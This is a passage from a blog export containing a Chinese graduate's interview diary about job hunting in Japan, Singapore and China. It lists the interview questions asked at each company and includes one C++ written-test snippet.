层没有修炼。（作者谦虚的表示后面还有很多工作要做）\n\n附：如何用科学语言表达你实际的意思。\n\n\n\n\n\n\n\n--------------------------------------------------------------------------------","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2015-07-09T13:10:24.000Z","created_by":"1","updated_at":"2015-07-10T03:35:44.000Z","updated_by":"1","published_at":"2015-07-09T13:13:33.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bccd6bf9a5a920fc140c42","uuid":"13eb5f8a-420d-4786-9370-126ce0472f7d","title":"校招面经集合-肉身翻墙失败的经验","slug":"xiao-zhao-ying-pin","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"校招从 9 月开始，坚持到转年 6 月中旬结束，我算得上是实验室里打应聘持久战的奇葩了。自始至终基本都在找国外的工作，积累了不少经验教训。\\n\\n很多人一听到找出国的工作，立刻就觉得很难，其实不是这样，当你真的去了解这些东西，就会发现渠道真的是太多了，限制你的往往不是没有机会，而是有太多的机会摆在你面前，只是你能力不够，无法抓住，抑或仅仅是欠缺三分运气。\\n\\n##企鹅\\n拿到的第一个 offer 是企鹅的，原因很简单，实习生转正自动得到的。而且企鹅十分慷慨，一直等到了我 12 月底，而没有像其他公司那样催促交三方，在我全力应聘国外的时候，企鹅是坚强有力的后盾，值得感谢。\\n\\n##[启程日本](http://workinjapan.cn/)\\n整个校园招聘期间，启程日本算是我花了相当大精力，或者说主要精力的事情了。启程日本是专业的人力资源公司，类似于猎头，提供一个让中国学生和日本公司做对接的中间人作用吧，所有服务都是免费的，他们向招人成功的日本公司收服务费，而且通过它们跨国来中国招人的成本十分巨大，所以能来的公司都是效益非常好的牛企。\\n\\n###笔试\\n我是赶夏季招聘没有赶上，于是 6 月 30 号在大连理工大学做的秋季招聘笔试。从天津来回打飞的去大连大黑山脚下笔试，把咨询顾问感动坏了。\\n笔试都是小学数学题，包括售价折扣题、工程效率、相遇追及、简单逻辑等等，还有 90 分钟的心理测验，那些题目实在是太多了，做到最后都不知道自己怎么选的。\\n\\n###启程日本一面\\n一面是在企鹅实习的时候面的，启程日本的每个参与者都有自己专属的咨询顾问，这次面试算是正式认识了负责我的顾问，她们自称为咨询担当。主要问了一些 HR 面常见问题，重点还是了解你的意愿，好帮你报公司。\\n\\n1. 英文自我介绍\\n2. 对启程日本有没有了解\\n3. 选择公司的因素\\n4. 为什么去日本\\n5. 找国内工作的话，国内哪些公司你比较看重\\n6. 对日本的生活有没有了解\\n7. 你大学中印象比较深刻的事情\\n8. 你性格上的优点和缺点\\n9. 别人如何评价你\\n\\n不知道是不是因为我条件很不错，后面再没有经历过启程日本这边的面试，和网上看到的要过两三轮完全不符，也就是说启程日本这边已经合格了，后面一直在参加企业面。\\n\\n日本公司的风格感觉和国内互联网完全不同，简历关非常难过，NTT Communications、NS Solutions、Uniccs、Recruit 五个部门的三个，简历都直接挂了。总结了一下，凡是做系统开发的公司，简历都挂了。简历通过进入面试的只有 MonotaRO、Recruit sumai、Recruit Lifestyle\\n\\n###MonotaRO 一面\\nMonotaRO 算是所有日本公司里面的 dream offer 了，这是一家少见的，以加班少为优势进行招聘宣传的公司，在日本公司来说，不加班真的是难得了，而且它是一家上市公司，非常稳定，发展也好。另外就是公司位于兵库县尼琦市，远离东京的喧嚣，反正符合我选公司的所有要求，没有任何让人不满意的地方。\\n\\n面试的翻译十分给力，他会理解了你的意思后再翻译，配合的很默契。问题主要有：\\n\\n1. 你喜欢自己搞事情还是团队搞\\n2. 你在腾讯是如何与别人协作的\\n3. 为什么来日本\\n4. 为什么 MonotaRO\\n5. 你擅长什么，不擅长什么。技术上和生活上分别答\\n6. 列出你知道的排序\\n7. 写了个算法，该算法的缺点是什么\\n8. python 处理百万条数据的效率如何\\n\\n总之，技术题全答对了，他们对技术要求实在是不高，让我列出知道的排序算法，我说了八九个吧，然后我以为接下来会让我写几个，结果就没有然后了。闹了半天说出名字就可以。技术面试官除了一直在点头表示开心，我没看出任何别的反应。但是 HR 面就很搞了，这位面试官在拿着我的心理测试报告狂研究，感觉就像玩三国志一样，他们居然把人的性格各个维度给量化了，然后他画了几个圈，就开始各种纠结我的团队协作问题，早知道这样，当时在大连做测试时，就不选这么多性格独立了。\\n\\n反正最后还是过了，下午二面，我前面还有三个人一起进去二面，出来的时候直接拿着 offer 和合同出来的，当场就发。。。\\n###MonotaRO 二面\\n我以为也会给我发 offer，结果他们说上午有问题忘了问，继续面试。\\n\\n1. 当 leader 的经历\\n2. 一个产品，你觉得想法不行，员工都觉得行，最后你没拗过员工，做了，结果失败了，应该谁负责。\\n3. 快速迭代和打磨品质，你更看重哪个\\n3. 你对MonotaRO 了解多少\\n4. 你觉得公司哪里可以改进\\n5. 解释死锁\\n\\n聊了很长时间当 leader 的问题，最后问了点技术，技术依然全过，主要还是 HR 问题，最后就是回去等结果。\\n\\n后来通过咨询顾问了解到，MonotaRO 上海场一个人也没招到，都刷了，最后就发了北京场我前面那三个人的 offer，我是唯一的备胎，只要那三个人有一个人拒掉，offer 就会给我。以前每次都有人拒，所以顾问觉得我八九不离十，结果没想到今年三个人都接受了，一个拒的也没有，然后我就挂了，顾问也是觉得十分无奈。\\n\\n###Recruit sumai\\n这就是日本的搜房网，面试官是一个大叔和一个眼镜娘，我这边是我和一个翻译。大叔很可爱，眼镜娘很高冷。可惜这场的翻译不给力，磕磕巴巴的，严重影响发挥。真是哪行都有混日子的人。\\n\\n1. 他介绍了公司的情况\\n1. 你做了这么多项目，最成功的是哪一个\\n2. 你对什么技术感兴趣\\n3. 有了这些技术后，你觉得你能为我们做出什么服务\\n4. 你的缺点是什么\\n5. 你的朋友是如何评价你的\\n6. 你的 C 语言很有自信，是吧\\n7. 你觉得你为了什么工作：钱、工作本身、人、地位\\n8. 你觉得工作中什么时候你最快乐\\n9. 你觉得工作的意义在哪里。\\n10. 你是哪里的人，你的童年是什么样子的\\n11. 为什么来日本\\n\\n他们问技术也挺搞笑的，或者说根本不问，他问是不是对 C 有信心，我说是，那按照一般的剧情，应该会问俩 C 的问题，结果就这么结束了。有信心，有，好，那问点别的。。。\\n\\n结果和 MonotaRO 类似，他们给我加了锁，然后回去等，依然是备胎，别人拒了轮到我，然而最终依然没轮到我。\\n\\n###Recruit Lifestyle\\n同样是两个面试官，一个翻译。这家面试官非常像王石，我一进屋，我靠，这不是王石么，另一个面试官英语还行。\\n\\n1. 王石介绍了公司的情况\\n2. 为什么来我们公司\\n3. 你觉得你能给我们带来什么\\n4. 你最有自信的技术，举例子说明。\\n5. 用英语描述一个做过的最困难的项目\\n\\n最后用英语描述项目比较尴尬，我说的东西，面试官可以懂，但我听不懂面试官的英语，因为我总感觉他在说日语，听不出来那是英语，结果就变成了“我说英语 -> 面试官用英语提问 -> 我卖萌表示不懂 -> 面试官冲翻译用日语提问 -> 翻译冲我说中文 -> 我继续说英语”\\n\\n最后这家没通过，因为我提的一个想法他们以前想过，然后关键问题我又没答到点儿上，算是撞枪口了吧。\\n\\n面这家公司印象最深的不是公司本身，也不是王石，而是翻译。面试时所有的翻译都是从翻译公司找的专业翻译，但这个翻译明显技高一筹，我前面我后面所有参加面试的人，出来以后，第一句话基本都是这个翻译好厉害啊，什么都能翻。而且有一些略懂日语的人可以听出来，他不仅仅是翻译，他还会把面试者说的没什么逻辑的回答，给整理润色一下，帮你给圆上。真是业界良心。\\n\\n我能明显感觉到他和我经历过的其他翻译不一样，中国人说日语的腔调和日本人是有差别的，而且总会存在思考、遣词造句的小停顿，但是他说日语完全和母语一样，根本不用思考，语速比对面的日本面试官还要快，连口音和腔调都没差别，对比之下，好像他才是日本人，对面的面试官是冒牌货。反正我觉得如果没有特殊的机缘在特定的年龄接受过双语教育，通过后天学习很难练到这种水平。\\n\\n## AHRP\\nAHRP 是另外一个赴日项目，但是感觉办的没有启程日本如火如荼，现在连官网都挂掉了。我在 AHRP 参加了雅虎日本、面白法人 Kayac、YUMEMI，雅虎日本简历关就挂了。进面试的是 Kayac 和 YUMEMI，AHRP 人员很少，顾问就是翻译，每次都是和顾问配合，她特别像台湾人，不过没好意思问她。\\n\\n###AHRP 一面\\n报雅虎日本的时候，还是 6 月，所以参加了一个早期面试，类似于初筛吧\\n\\n1. 怎么知道 AHRP 这个项目的。\\n2. 为什么要去海外就业\\n3. 简历相关，考研历程\\n4. 为什么读研\\n5. 读研生活和你想的是否一样\\n6. 研究方向\\n7. 是否想去深造\\n8. 给出选公司最看重的三个方面。\\n9. 有没有理想的想去的公司\\n10. 为什么去日本的公司。\\n11. 有没有在其他公司的校招流程中\\n\\n其实就是聊一聊，初步了解一下你。\\n\\n###AHRP 二面\\n二面是日本顾问伊野濑澄先生和一个翻译。依然是一些了解你性格的问题。问了问：简历的细节，为什么出国，最成功项目，自己的兴趣的项目，父母同意吗等等等等\\n\\n到此为止，AHRP 这边算是过了，接下来就都是企业面了。\\n\\n### 面白法人 Kayac 一面\\n1. 介绍一下做过的项目\\n3. 自己因兴趣做的项目\\n3. 做没做过 WebService 的项目\\n4. 将来想做哪方面\\n4. 你码代码注重哪些方面\\n4. 有没有崇拜的一个人，崇拜哪一点\\n3. 为什么去日本\\n4. 你在新加坡呆过，英语肯定好，有没有更长远的规划。\\n\\n我主要问了问这次招人是去横滨还是镰仓，总之感觉面试官不苟言笑，也不知道他想找啥样的人，反正没过。\\n\\n###YUMEMI 一面\\nYUMEMI 是 AHRP 这边离 offer 最近的公司了，一面是两个人一起面，同样的问题一个人答完了另一个人答，和我一起面试的是一个北大的本科生，先是例行常规问些为什么去日本，为什么我们公司等等问题，然后就是分别介绍一个做过的项目。我介绍了本科时做的游戏引擎，北大那哥们介绍了一个电商网站，因为我那个是直接能玩的游戏，太炫了，所以直接胜出，把他 PK 下去了。二面的时候他已经不在了。\\n\\n###YUMEMI 二面\\n二面面试官增加了社长本人，然后依然问一些 HR 问题，比如喜欢快速迭代还是打磨品质，最成功的项目等等等等，他们想要前端的人，我是做后端的，所以技术上不匹配，他们也可以要后端，但是得会 php，我又不会 php，不过他们还是给我机会了，可能是看我比较靠谱吧。\\n\\n最后他们问如果现在给 offer 签不签，但是我正在等 MonotaRO 的通知啊，那个 dream offer 啊，所以我只能说还得考虑下，他们就追问考虑什么因素等等等等。\\n\\n最后还是没过，我感觉如果我答应签，或许会过吧，因为后来了解到强烈的意愿也是 AHRP 这边招人看重的一个因素，总之就是阴差阳错，两家不错的公司都说了再见。\\n\\n## ADSC Singapore\\n这是 UIUC 在新加坡的海外研究中心，招 Software Engineer 做一些论文或者项目的工程实现，主要招前端的人，但还是给我了面试机会。\\n\\n1. 介绍一下做的项目，说了腾讯抓取数据项目\\n2. 有数据库，有爬取的名字，如何优化查询\\n3. 有网页，怎样从数据库中快速匹配\\n4. smu 的项目\\n4. normalization 是什么\\n5. soap，restful，php，jsp 知道不知道\\n6. 你有什么问题\\n\\n我不是搜索方向，也没做过网络项目，虽然答的差不多，但专业一点就不行了，最后没过。\\n\\n##Dynamic Technology Lab Singapore\\n这是一家新加坡的股票量化交易公司，反正是一个极牛的地方吧，年后主要精力都放在它身上了。\\n###笔试\\n笔试就很有难度。比如其中有这么几个题目：\\n\\n<ol>\\n  <li>Is the following C++ code correct? Please explain why</li>\\n\\n<pre><code>\\nbool IsFriday(const std::string &day)\\n{\\n    return day == \\\"Friday\\\";\\n} \\nbool IsFriday(const char *day)\\n{\\n    return strcmp(day, \\\"Friday\\\") == 0;\\n}\\nint main(int argc, const char *argv[])\\n{\\n    IsFriday(\\\"Friday\\\");\\n    IsFriday(std::string(\\\"Friday\\\"));\\n    IsFriday(std::string(\\\"Friday\\\").c_str());\\n    const char *s = std::string(\\\"Friday\\\").c_str();\\n    IsFriday(s);\\n    return 0;\\n}\\n</code></pre>\\n\\n<li>Please explain how to reduce packet loss on each layer of TCP/IP stack?</li>\\n<li>What is memory reordering? Please give an example and explanation.</li>\\n<li>How can CPU cache affect your algorithm design? Please give an example and explanation.</li>\\n</ol>\\n###项目\\n笔试过后，居然让用 5 天时间做个小项目，合并两个数十 GB 的大文件，是一个多线程解决外排序的问题，并且要给出测试代码。最终也过了。过程算是惊心动魄吧，前三天误解了题意，最后两天刷夜搞定的，还顺带自学了 Google Test 测试框架。\\n### DTL 一面\\n一面是个爱笑的大叔。\\n\\n1. 介绍毕设项目\\n2. 介绍腾讯项目\\n2. std::string 内部实现\\n2. copy on write 具体实现（引用计数）\\n2. TOP k 问题（堆，快排，部分冒泡）\\n2. map unordered_map 如何取舍\\n2. 多线程做没做过\\n2. 网络做没做过\\n2. 为什么新加坡\\n2. 为什么选我们，不去更热的移动互联网\\n\\n###DTL 二面\\n\\n3. 做过的项目\\n2. c++ 和其他语言的选取\\n1. 对什么业务感兴趣\\n1. 五年后有什么打算\\n1. 为什么移民\\n1. 关注什么前沿的事情\\n1. 因为兴趣做过什么项目\\n1. 喜欢独立还是团队\\n1. 会不会坚持己见\\n1. 对互联网金融是否感兴趣\\n\\n二面感觉不好，问的性格和价值观的问题太多了，这种问题问多了就很难和公司匹配上，然后就挂了，很难讲挂了是好还是不好，总之感觉有点可惜罢了。毕竟投入了很多。\\n##Morgan Stanley\\n如果留在国内的话，Morgan IT 算是我梦寐以求的 offer 了，找了本科基友帮我内推，之后就是笔试。可以选择 Java，C#，C++ 三种卷子，笔试是 IKM Assessment，相当相当的难，我感觉没对几道。不过好在还是过了，接下来是电面，全程英文。不知道是不是和阿三打交道太多，电面的面试官明明是中国人，说英语却带着淡淡的咖喱口音。面试题中规中矩，基本符合网上的面经，但是个别能加分的发挥题我基本都没答上来。\\n\\n1. introduce yourself\\n2. why not tencent\\n3. introduce a project you did and what problem you solved\\n4. what is recursion？\\n5. what is hashtable？\\n6. how to implement a hashtable, what data structure should be used？\\n7. stack and heap\\n8. in what scenario，we can only use heap.\\n9. memory leak\\n10. how to detect memory leak\\n11. what is virtual function\\n12. how to implement virtual function and polymorphism\\n13. what is copy constructor\\n14. for a given string, how to output all the different combination. \\n\\n自己基本都答上来了，都很基础，其实相对于题目本身的技术而言，更大的考验是你怎么用英语去答这些问题，去描述这些概念，尤其是涉及到专业词汇的时候。然而这轮挂掉了，我也没想太明白为啥我挂了。\\n\\n##VMware 上海\\nVMware 真的是一个好地方，这是一个晚上 8 点就已经是深夜的公司，让无数晚上 8 点夜生活刚刚开始的互联网公司人望洋兴叹。\\n\\n笔试题目还是很有难度的，涉及到不少内核的知识，主要内容包括 C++、自旋锁、设备描述表、gdb、反汇编、网络、概率、数字推理。自己编程实现 ftoa、自己编程实现栈，并用双栈实现队列、英文写作（一道题是探讨公有云私有云混合云，另一道是给主管写信，因为工作需要申请一部 iphone）\\n\\n好像我的笔试成绩最后排第三，实验室哥们排第二。之后就是面试了。 面试的过程也是英语口语加技术，英语只有一小点儿，敢说就行了，因为面试官的英语说的真心不怎么样。\\n\\n1. 有一个 C 程序，定义了一个变量 i，结果继续执行几行与 i 无关的代码之后，i 的值变了，为什么？\\n2. 函数想返回多个返回值怎么半\\n3. 面向对象了解多少\\n4. python 相关问题\\n5. 1000 个苹果分 10 个箱子装，要任何数字的苹果都能通过几个箱子的组合得到，应该如何装。\\n\\n反正整体的面试完全不在状态，和面试官不在一个频道上。第一题特别有意思，当时答了很多种答案，感觉像是压力面，回来之后思考了一下，觉得他可能是想考缓冲区溢出，或者线程安全问题。\\n\\n全程感觉面试官很怕伤到你似的，问我会不会 python，我说会，但我编 Python 需要有手册在边上，然后他居然说那就算了，不问了。问我了不了解面向对象，我以为面向对象就是 C++，我说我了解，结果他问继承和虚函数这种关系是什么 dependency，我又只能答不知道。面试题的设计感觉也是想虐你，而不是让你展示自己，反正从应聘开始到面试结束，给人的感觉是极其不专业，和 BAT 比差一截。\\n\\n最后问我是不是一定去上海不服从调剂，愿不愿意来北京，我说不愿意，然后出门我就知道肯定没戏，如果说愿意去北京，说不定能过。虽然感觉不好，但这是一个给 22 万还不加班的好地方啊。\\n\\n##天津渣打科营\\n这是一个传说中养老的地方，天津能给 11k 还不加班的公司，也是有点神了。它组织了一个 Open Day，我去了，公司给人感觉很 low，原因是它在带领大家参观的时候，主要介绍了 pantry，免费零食啥的，我觉得如果一个公司只能介绍这些东西了，那它也实在是没别的可说了。 在职员工做宣传的时候也很搞笑，她夸了渣打很好很不错，在她毕业求职各种碰壁各种不要她的时候收留了她，给了她机会。这么说的确是很好啊，但换个角度讲，那不是相当于它的要人标准低么？反正员工给人的整体感觉是眼界不够开阔。\\n\\n个人曾在渣打对面的企鹅呆了三个月，开发区的生活品质太差劲了，物价贵的要死，空气差的要死。Open Day 的时候问了问领队，可不可能 relocate，领队说在马来和印度还有科营。我靠，仔细思考了一下，难道我要 relocate 到印度吃飞饼和咖喱鸡吗？领队还说这里不保证不加班，那就完全没有兴趣了。\\n\\n##Worldquant\\n这家一开始是想去的，结果一方面发现它永远在招人，另一方面发现glassdoor 上的评价很差，于是就没有参加笔试。\\n\\n## Cisco 杭州、上海\\n简历过了，但是天津没有笔试考场，需要去北邮笔试，关键是和日本 indeed 的在线笔试时间一样，冲突无法避免，于是没去。\\n\\n##UBS Singapore\\n瑞银感觉相当不错，作死地投了新加坡和香港，而并非上海。然后发来了 Online Test，题目和行测差不多，做完之后一个月左右收到拒信，情理之中。\\n\\n##Goldman Sachs HK\\n同样作死地没投北京，而是投了香港。这次连 Online Test 都没有，好像没收到拒信，石沉大海。据说他们喜欢要实习生转正的。\\n\\n---\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>校招从 9 月开始，坚持到转年 6 月中旬结束，我算得上是实验室里打应聘持久战的奇葩了。自始至终基本都在找国外的工作，积累了不少经验教训。</p>\n<p>很多人一听到找出国的工作，立刻就觉得很难，其实不是这样，当你真的去了解这些东西，就会发现渠道真的是太多了，限制你的往往不是没有机会，而是有太多的机会摆在你面前，只是你能力不够，无法抓住，抑或仅仅是欠缺三分运气。</p>\n<h2 id=\"\">企鹅</h2>\n<p>拿到的第一个 offer 是企鹅的，原因很简单，实习生转正自动得到的。而且企鹅十分慷慨，一直等到了我 12 月底，而没有像其他公司那样催促交三方，在我全力应聘国外的时候，企鹅是坚强有力的后盾，值得感谢。</p>\n<h2 id=\"\"><a href=\"http://workinjapan.cn/\">启程日本</a></h2>\n<p>整个校园招聘期间，启程日本算是我花了相当大精力，或者说主要精力的事情了。启程日本是专业的人力资源公司，类似于猎头，提供一个让中国学生和日本公司做对接的中间人作用吧，所有服务都是免费的，他们向招人成功的日本公司收服务费，而且通过它们跨国来中国招人的成本十分巨大，所以能来的公司都是效益非常好的牛企。</p>\n<h3 id=\"\">笔试</h3>\n<p>我是赶夏季招聘没有赶上，于是 6 月 30 号在大连理工大学做的秋季招聘笔试。从天津来回打飞的去大连大黑山脚下笔试，把咨询顾问感动坏了。<br>\n笔试都是小学数学题，包括售价折扣题、工程效率、相遇追及、简单逻辑等等，还有 90 分钟的心理测验，那些题目实在是太多了，做到最后都不知道自己怎么选的。</p>\n<h3 id=\"\">启程日本一面</h3>\n<p>一面是在企鹅实习的时候面的，启程日本的每个参与者都有自己专属的咨询顾问，这次面试算是正式认识了负责我的顾问，她们自称为咨询担当。主要问了一些 HR 面常见问题，重点还是了解你的意愿，好帮你报公司。</p>\n<ol>\n<li>英文自我介绍</li>\n<li>对启程日本有没有了解</li>\n<li>选择公司的因素</li>\n<li>为什么去日本</li>\n<li>找国内工作的话，国内哪些公司你比较看重</li>\n<li>对日本的生活有没有了解</li>\n<li>你大学中印象比较深刻的事情</li>\n<li>你性格上的优点和缺点</li>\n<li>别人如何评价你</li>\n</ol>\n<p>不知道是不是因为我条件很不错，后面再没有经历过启程日本这边的面试，和网上看到的要过两三轮完全不符，也就是说启程日本这边已经合格了，后面一直在参加企业面。</p>\n<p>日本公司的风格感觉和国内互联网完全不同，简历关非常难过，NTT Communications、NS Solutions、Uniccs、Recruit 五个部门的三个，简历都直接挂了。总结了一下，凡是做系统开发的公司，简历都挂了。简历通过进入面试的只有 MonotaRO、Recruit sumai、Recruit Lifestyle</p>\n<h3 id=\"monotaro\">MonotaRO 一面</h3>\n<p>MonotaRO 算是所有日本公司里面的 dream offer 了，这是一家少见的，以加班少为优势进行招聘宣传的公司，在日本公司来说，不加班真的是难得了，而且它是一家上市公司，非常稳定，发展也好。另外就是公司位于兵库县尼琦市，远离东京的喧嚣，反正符合我选公司的所有要求，没有任何让人不满意的地方。</p>\n<p>面试的翻译十分给力，他会理解了你的意思后再翻译，配合的很默契。问题主要有：</p>\n<ol>\n<li>你喜欢自己搞事情还是团队搞</li>\n<li>你在腾讯是如何与别人协作的</li>\n<li>为什么来日本</li>\n<li>为什么 MonotaRO</li>\n<li>你擅长什么，不擅长什么。技术上和生活上分别答</li>\n<li>列出你知道的排序</li>\n<li>写了个算法，该算法的缺点是什么</li>\n<li>python 处理百万条数据的效率如何</li>\n</ol>\n<p>总之，技术题全答对了，他们对技术要求实在是不高，让我列出知道的排序算法，我说了八九个吧，然后我以为接下来会让我写几个，结果就没有然后了。闹了半天说出名字就可以。技术面试官除了一直在点头表示开心，我没看出任何别的反应。但是 HR 面就很搞了，这位面试官在拿着我的心理测试报告狂研究，感觉就像玩三国志一样，他们居然把人的性格各个维度给量化了，然后他画了几个圈，就开始各种纠结我的团队协作问题，早知道这样，当时在大连做测试时，就不选这么多性格独立了。</p>\n<p>反正最后还是过了，下午二面，我前面还有三个人一起进去二面，出来的时候直接拿着 offer 和合同出来的，当场就发。。。</p>\n<h3 id=\"monotaro\">MonotaRO 二面</h3>\n<p>我以为也会给我发 offer，结果他们说上午有问题忘了问，继续面试。</p>\n<ol>\n<li>当 leader 的经历</li>\n<li>一个产品，你觉得想法不行，员工都觉得行，最后你没拗过员工，做了，结果失败了，应该谁负责。</li>\n<li>快速迭代和打磨品质，你更看重哪个</li>\n<li>你对MonotaRO 了解多少</li>\n<li>你觉得公司哪里可以改进</li>\n<li>解释死锁</li>\n</ol>\n<p>聊了很长时间当 leader 的问题，最后问了点技术，技术依然全过，主要还是 HR 问题，最后就是回去等结果。</p>\n<p>后来通过咨询顾问了解到，MonotaRO 上海场一个人也没招到，都刷了，最后就发了北京场我前面那三个人的 offer，我是唯一的备胎，只要那三个人有一个人拒掉，offer 就会给我。以前每次都有人拒，所以顾问觉得我八九不离十，结果没想到今年三个人都接受了，一个拒的也没有，然后我就挂了，顾问也是觉得十分无奈。</p>\n<h3 id=\"recruitsumai\">Recruit sumai</h3>\n<p>这就是日本的搜房网，面试官是一个大叔和一个眼镜娘，我这边是我和一个翻译。大叔很可爱，眼镜娘很高冷。可惜这场的翻译不给力，磕磕巴巴的，严重影响发挥。真是哪行都有混日子的人。</p>\n<ol>\n<li>他介绍了公司的情况</li>\n<li>你做了这么多项目，最成功的是哪一个</li>\n<li>你对什么技术感兴趣</li>\n<li>有了这些技术后，你觉得你能为我们做出什么服务</li>\n<li>你的缺点是什么</li>\n<li>你的朋友是如何评价你的</li>\n<li>你的 C 语言很有自信，是吧</li>\n<li>你觉得你为了什么工作：钱、工作本身、人、地位</li>\n<li>你觉得工作中什么时候你最快乐</li>\n<li>你觉得工作的意义在哪里。</li>\n<li>你是哪里的人，你的童年是什么样子的</li>\n<li>为什么来日本</li>\n</ol>\n<p>他们问技术也挺搞笑的，或者说根本不问，他问是不是对 C 有信心，我说是，那按照一般的剧情，应该会问俩 C 的问题，结果就这么结束了。有信心，有，好，那问点别的。。。</p>\n<p>结果和 MonotaRO 类似，他们给我加了锁，然后回去等，依然是备胎，别人拒了轮到我，然而最终依然没轮到我。</p>\n<h3 id=\"recruitlifestyle\">Recruit Lifestyle</h3>\n<p>同样是两个面试官，一个翻译。这家面试官非常像王石，我一进屋，我靠，这不是王石么，另一个面试官英语还行。</p>\n<ol>\n<li>王石介绍了公司的情况</li>\n<li>为什么来我们公司</li>\n<li>你觉得你能给我们带来什么</li>\n<li>你最有自信的技术，举例子说明。</li>\n<li>用英语描述一个做过的最困难的项目</li>\n</ol>\n<p>最后用英语描述项目比较尴尬，我说的东西，面试官可以懂，但我听不懂面试官的英语，因为我总感觉他在说日语，听不出来那是英语，结果就变成了“我说英语 -&gt; 面试官用英语提问 -&gt; 我卖萌表示不懂 -&gt; 面试官冲翻译用日语提问 -&gt; 翻译冲我说中文 -&gt; 我继续说英语”</p>\n<p>最后这家没通过，因为我提的一个想法他们以前想过，然后关键问题我又没答到点儿上，算是撞枪口了吧。</p>\n<p>面这家公司印象最深的不是公司本身，也不是王石，而是翻译。面试时所有的翻译都是从翻译公司找的专业翻译，但这个翻译明显技高一筹，我前面我后面所有参加面试的人，出来以后，第一句话基本都是这个翻译好厉害啊，什么都能翻。而且有一些略懂日语的人可以听出来，他不仅仅是翻译，他还会把面试者说的没什么逻辑的回答，给整理润色一下，帮你给圆上。真是业界良心。</p>\n<p>我能明显感觉到他和我经历过的其他翻译不一样，中国人说日语的腔调和日本人是有差别的，而且总会存在思考、遣词造句的小停顿，但是他说日语完全和母语一样，根本不用思考，语速比对面的日本面试官还要快，连口音和腔调都没差别，对比之下，好像他才是日本人，对面的面试官是冒牌货。反正我觉得如果没有特殊的机缘在特定的年龄接受过双语教育，通过后天学习很难练到这种水平。</p>\n<h2 id=\"ahrp\">AHRP</h2>\n<p>AHRP 是另外一个赴日项目，但是感觉办的没有启程日本如火如荼，现在连官网都挂掉了。我在 AHRP 参加了雅虎日本、面白法人 Kayac、YUMEMI，雅虎日本简历关就挂了。进面试的是 Kayac 和 YUMEMI，AHRP 人员很少，顾问就是翻译，每次都是和顾问配合，她特别像台湾人，不过没好意思问她。</p>\n<h3 id=\"ahrp\">AHRP 一面</h3>\n<p>报雅虎日本的时候，还是 6 月，所以参加了一个早期面试，类似于初筛吧</p>\n<ol>\n<li>怎么知道 AHRP 这个项目的。</li>\n<li>为什么要去海外就业</li>\n<li>简历相关，考研历程</li>\n<li>为什么读研</li>\n<li>读研生活和你想的是否一样</li>\n<li>研究方向</li>\n<li>是否想去深造</li>\n<li>给出选公司最看重的三个方面。</li>\n<li>有没有理想的想去的公司</li>\n<li>为什么去日本的公司。</li>\n<li>有没有在其他公司的校招流程中</li>\n</ol>\n<p>其实就是聊一聊，初步了解一下你。</p>\n<h3 id=\"ahrp\">AHRP 二面</h3>\n<p>二面是日本顾问伊野濑澄先生和一个翻译。依然是一些了解你性格的问题。问了问：简历的细节，为什么出国，最成功项目，自己的兴趣的项目，父母同意吗等等等等</p>\n<p>到此为止，AHRP 这边算是过了，接下来就都是企业面了。</p>\n<h3 id=\"kayac\">面白法人 Kayac 一面</h3>\n<ol>\n<li>介绍一下做过的项目</li>\n<li>自己因兴趣做的项目</li>\n<li>做没做过 WebService 的项目</li>\n<li>将来想做哪方面</li>\n<li>你码代码注重哪些方面</li>\n<li>有没有崇拜的一个人，崇拜哪一点</li>\n<li>为什么去日本</li>\n<li>你在新加坡呆过，英语肯定好，有没有更长远的规划。</li>\n</ol>\n<p>我主要问了问这次招人是去横滨还是镰仓，总之感觉面试官不苟言笑，也不知道他想找啥样的人，反正没过。</p>\n<h3 id=\"yumemi\">YUMEMI 一面</h3>\n<p>YUMEMI 是 AHRP 这边离 offer 最近的公司了，一面是两个人一起面，同样的问题一个人答完了另一个人答，和我一起面试的是一个北大的本科生，先是例行常规问些为什么去日本，为什么我们公司等等问题，然后就是分别介绍一个做过的项目。我介绍了本科时做的游戏引擎，北大那哥们介绍了一个电商网站，因为我那个是直接能玩的游戏，太炫了，所以直接胜出，把他 PK 下去了。二面的时候他已经不在了。</p>\n<h3 id=\"yumemi\">YUMEMI 二面</h3>\n<p>二面面试官增加了社长本人，然后依然问一些 HR 问题，比如喜欢快速迭代还是打磨品质，最成功的项目等等等等，他们想要前端的人，我是做后端的，所以技术上不匹配，他们也可以要后端，但是得会 php，我又不会 php，不过他们还是给我机会了，可能是看我比较靠谱吧。</p>\n<p>最后他们问如果现在给 offer 签不签，但是我正在等 MonotaRO 的通知啊，那个 dream offer 啊，所以我只能说还得考虑下，他们就追问考虑什么因素等等等等。</p>\n<p>最后还是没过，我感觉如果我答应签，或许会过吧，因为后来了解到强烈的意愿也是 AHRP 这边招人看重的一个因素，总之就是阴差阳错，两家不错的公司都说了再见。</p>\n<h2 id=\"adscsingapore\">ADSC Singapore</h2>\n<p>这是 UIUC 在新加坡的海外研究中心，招 Software Engineer 做一些论文或者项目的工程实现，主要招前端的人，但还是给我了面试机会。</p>\n<ol>\n<li>介绍一下做的项目，说了腾讯抓取数据项目</li>\n<li>有数据库，有爬取的名字，如何优化查询</li>\n<li>有网页，怎样从数据库中快速匹配</li>\n<li>smu 的项目</li>\n<li>normalization 是什么</li>\n<li>soap，restful，php，jsp 知道不知道</li>\n<li>你有什么问题</li>\n</ol>\n<p>我不是搜索方向，也没做过网络项目，虽然答的差不多，但专业一点就不行了，最后没过。</p>\n<h2 id=\"dynamictechnologylabsingapore\">Dynamic Technology Lab Singapore</h2>\n<p>这是一家新加坡的股票量化交易公司，反正是一个极牛的地方吧，年后主要精力都放在它身上了。</p>\n<h3 id=\"\">笔试</h3>\n<p>笔试就很有难度。比如其中有这么几个题目：</p>\n<ol>\n  <li>Is the following C++ code correct? Please explain why</li>\n<pre><code>\nbool IsFriday(const std::string &day)\n{\n    return day == \"Friday\";\n} \nbool IsFriday(const char *day)\n{\n    return strcmp(day, \"Friday\") == 0;\n}\nint main(int argc, const char *argv[])\n{\n    IsFriday(\"Friday\");\n    IsFriday(std::string(\"Friday\"));\n    